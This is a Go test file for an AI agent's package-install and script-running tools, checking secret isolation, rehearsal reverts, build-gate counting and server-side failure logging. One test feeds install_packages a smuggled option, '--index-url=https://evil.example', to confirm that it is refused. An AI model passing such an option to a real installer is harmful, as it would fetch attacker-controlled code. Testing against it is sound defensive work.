package coder

import (
	"bytes"
	"context"
	"fmt"
	"log/slog"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/rookery-ai/rookery/internal/buildphase"
	"github.com/rookery-ai/rookery/internal/llm"
	"github.com/rookery-ai/rookery/internal/skilldeps"
	"github.com/rookery-ai/rookery/internal/vault"
)

func offeredTools(h *hostToolSet) map[string]bool {
	out := map[string]bool{}
	for _, t := range h.tools() {
		out[t.Name] = true
	}
	return out
}

func TestDepsToolsOfferedOnlyWhereCodeRuns(t *testing.T) {
	run := offeredTools(&hostToolSet{includeExecTools: true})
	if !run["install_packages"] || !run["run_in_env"] {
		t.Error("agent runs and builds must be offered install_packages and run_in_env")
	}
	chat := offeredTools(&hostToolSet{includeExecTools: false})
	if chat["install_packages"] || chat["run_in_env"] {
		t.Error("chat has no exec tools and must not get these")
	}
}

func TestInstallPackagesRefusedDuringASkillBuild(t *testing.T) {
	h := &hostToolSet{includeExecTools: true, subprocessEnv: map[string]string{buildphase.KindEnvVar: buildphase.KindSkill}}
	out := h.execute(context.Background(), llm.ToolCall{Name: "install_packages", Args: []byte(`{"env":"x","packages":["requests"]}`)})
	if !strings.HasPrefix(out, "error:") || !strings.Contains(out, skilldeps.ErrSkillBuild.Error()) {
		t.Fatalf("got %q, want the skill-build refusal", out)
	}
}

// fakeVenvPython: `-m venv DIR` copies itself to DIR/bin/python; anything else runs the
// real interpreter. Enough to exercise run_in_env without network or a real venv.
func fakeVenvPython(t *testing.T) string {
	t.Helper()
	if _, err := exec.LookPath("python3"); err != nil {
		t.Skip("python3 not available")
	}
	p := filepath.Join(t.TempDir(), "python3")
	src := "#!/usr/bin/env python3\nimport os, sys, shutil\na = sys.argv[1:]\nif a[:2] == ['-m', 'venv']:\n    os.makedirs(os.path.join(a[2], 'bin'), exist_ok=True)\n    d = os.path.join(a[2], 'bin', 'python')\n    shutil.copy(os.path.realpath(__file__), d)\n    os.chmod(d, 0o755)\n    sys.exit(0)\nos.execv(sys.executable, [sys.executable] + a)\n"
	if err := os.WriteFile(p, []byte(src), 0o755); err != nil {
		t.Fatal(err)
	}
	return p
}

func TestRunInEnvPassesOnlyNamedSecrets(t *testing.T) {
	work := t.TempDir()
	if err := os.WriteFile(filepath.Join(work, "s.py"), []byte("import os\nprint(sorted(k for k in os.environ if k.endswith('_SECRET')))\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	h := &hostToolSet{
		includeExecTools: true, workDir: work, homesDir: t.TempDir(), workspaceID: "ws",
		subprocessEnv: map[string]string{"A_SECRET": "1", "B_SECRET": "2"},
		deps:          skilldeps.Runner{Python: fakeVenvPython(t)},
	}
	out := h.execute(context.Background(), llm.ToolCall{Name: "run_in_env", Args: []byte(`{"env":"x","script":"s.py","secrets":["A_SECRET"]}`)})
	if strings.TrimSpace(out) != "['A_SECRET']" {
		t.Fatalf("script saw %q, want only A_SECRET", out)
	}
}

func TestRunInEnvUnknownSecretNamesItWithoutValues(t *testing.T) {
	h := &hostToolSet{includeExecTools: true, workDir: t.TempDir(), homesDir: t.TempDir(), workspaceID: "ws",
		subprocessEnv: map[string]string{"A_SECRET": "s3cr3t-value"}}
	out := h.execute(context.Background(), llm.ToolCall{Name: "run_in_env", Args: []byte(`{"env":"x","script":"s.py","secrets":["NOPE_SECRET","A_SECRET"]}`)})
	if !strings.HasPrefix(out, "error:") || !strings.Contains(out, "NOPE_SECRET") {
		t.Fatalf("got %q, want an error naming NOPE_SECRET", out)
	}
	if strings.Contains(out, "s3cr3t-value") {
		t.Fatal("error leaked a secret value")
	}
}

// A rehearsal (agent build, create-build dry run) must not leave a knowledge-base edit
// behind: run_in_env's sandbox grants the vault read-write, so it must sit inside the
// same journal bracket run_script and bash do.
func TestRunInEnvIsRevertedInARehearsal(t *testing.T) {
	v := vault.New(t.TempDir())
	note := filepath.Join(v.Root("ws"), "notes", "n.md")
	if err := os.MkdirAll(filepath.Dir(note), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(note, []byte("original"), 0o644); err != nil {
		t.Fatal(err)
	}
	work := t.TempDir()
	if err := os.WriteFile(filepath.Join(work, "s.py"), []byte(fmt.Sprintf("open(%q, 'w').write('REHEARSAL')\nprint('done')\n", note)), 0o644); err != nil {
		t.Fatal(err)
	}
	j := v.NewWriteJournal("ws")
	h := &hostToolSet{includeExecTools: true, workDir: work, homesDir: t.TempDir(), workspaceID: "ws", vlt: v, journal: j,
		deps: skilldeps.Runner{Python: fakeVenvPython(t)}}
	if out := h.execute(context.Background(), llm.ToolCall{Name: "run_in_env", Args: []byte(`{"env":"x","script":"s.py"}`)}); strings.HasPrefix(out, "error:") {
		t.Fatalf("run_in_env: %s", out)
	}
	if _, err := j.Revert(); err != nil {
		t.Fatal(err)
	}
	got, _ := os.ReadFile(note)
	if string(got) != "original" {
		t.Fatalf("note after revert = %q, want the original back", got)
	}
}

// A skill build is told to run its script with run_in_env, so the build gate must
// count that as running it. Counting only run_script left every such build nudged to
// the limit and recorded as script_ran=false — the trading-consultant build.
func TestRunInEnvSatisfiesTheBuildGate(t *testing.T) {
	h := &hostToolSet{verifyBuild: true, workDir: t.TempDir(), spec: SkillBuildSpec}
	h.trackScriptProgress(toolCall("write_file", `{"path":"scripts/run_analysis.py"}`), "ok: wrote", false)
	if !h.needsScriptVerification() {
		t.Fatal("an authored, never-run script must need verification")
	}
	h.trackScriptProgress(toolCall("run_in_env", `{"env":"x","script":"scripts/run_analysis.py","args":["--help"]}`), "usage: run_analysis.py [-h]", false)
	if h.needsScriptVerification() {
		t.Error("a run_in_env call with real stdout must satisfy the gate")
	}
	if !h.ranAuthoredScript {
		t.Error("a run_in_env call must count as running the authored script")
	}
}

// A failed install or script run used to reach only the model, so a run recording
// "run_in_env ×4 (4 err)" could not be explained from the server. Both now log the
// cause — exit code and the tail of stderr — and never a secret's value.
func TestDepsFailuresAreLoggedOnTheServer(t *testing.T) {
	var buf bytes.Buffer
	prev := slog.Default()
	slog.SetDefault(slog.New(slog.NewTextHandler(&buf, nil)))
	defer slog.SetDefault(prev)

	work := t.TempDir()
	if err := os.WriteFile(filepath.Join(work, "s.py"), []byte("import sys\nsys.stderr.write('no complete_report.md was produced\\n')\nsys.exit(1)\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	h := &hostToolSet{includeExecTools: true, workDir: work, homesDir: t.TempDir(), workspaceID: "ws", agentName: "a",
		subprocessEnv: map[string]string{"A_SECRET": "s3cr3t-value"},
		deps:          skilldeps.Runner{Python: fakeVenvPython(t)}}

	h.execute(context.Background(), llm.ToolCall{Name: "run_in_env", Args: []byte(`{"env":"x","script":"s.py","secrets":["A_SECRET"]}`)})
	h.execute(context.Background(), llm.ToolCall{Name: "install_packages", Args: []byte(`{"env":"x","packages":["--index-url=https://evil.example"]}`)})

	logs := buf.String()
	for _, want := range []string{"run_in_env failed", "exit=1", "no complete_report.md was produced", "install_packages failed", "pip option"} {
		if !strings.Contains(logs, want) {
			t.Errorf("server log lacks %q:\n%s", want, logs)
		}
	}
	if strings.Contains(logs, "s3cr3t-value") {
		t.Error("server log leaked a secret value")
	}
}

func TestBashNoLongerForbidsInstallsOutright(t *testing.T) {
	for _, tool := range (&hostToolSet{includeExecTools: true}).tools() {
		if tool.Name == "bash" && strings.Contains(tool.Description, "Do NOT install packages") {
			t.Fatal("bash still forbids installs instead of pointing at install_packages")
		}
	}
}
